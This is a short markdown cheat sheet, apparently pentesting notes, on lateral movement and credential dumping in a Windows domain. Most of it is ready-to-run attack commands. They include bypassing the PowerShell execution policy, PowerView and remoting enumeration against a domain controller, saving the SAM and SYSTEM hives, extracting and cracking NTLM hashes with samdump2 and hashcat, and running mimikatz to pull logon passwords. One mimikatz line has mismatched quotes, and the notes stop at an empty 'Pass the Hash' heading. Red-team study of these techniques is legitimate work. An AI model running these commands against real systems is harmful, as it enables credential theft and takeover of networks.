# Lateral Movement

## Using PowerView

> Don't forget to import the script bypassing powershell execution policy

To test if you have an admin access on the current machine:

 ```powershell
 Test-AdminAccess -Verbose
 ```

To see what srevers you have access to:
 
 
 ```powershell
 Find-DomainUserLocation
 ```

 ```powershell
 Invoke-Command -ComputerName dc -ScriptBlock{whoami /groups; hostname}
 ```
  Using PowerShell Remoting
  
  ```powershell
  Enter-PSSession -ComputerName dc
  ```
  
  ## After Getting Local Admin Access...
  
 
 ### Dumping SAM\SYSTEM files for offline cracking:
 
  > C:\Windows\System32\config\SAM


 > C:\Windows\System32\config\SYSTEM

Copying the files to the current directory:

 ```batch
 reg save HKLM\sam sam
 
 reg save HKLM\system system
 ```
 
 On Kali Linux use the `samdump2` tool:
 
 ```bash
 samdump2 system sam
 ```
 
 Take the hashes and crack them with hashcat:
 
 ```bash
 hashcat -D 2 -m 1000 hashes.txt rockyou.txt -r OneRuleToRuleThemAll.rule
 ```
 
 ### SAM and LSA w/ mimikatz
 
 ```powershell
 powershell -ep bypass
 
 . .\invoke-mimikatz.ps1
 
 Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords' "lsadump::sam" "exit"'
  ```
 Copy the NTLM of the users 😈
 
 ### PASS the HASH
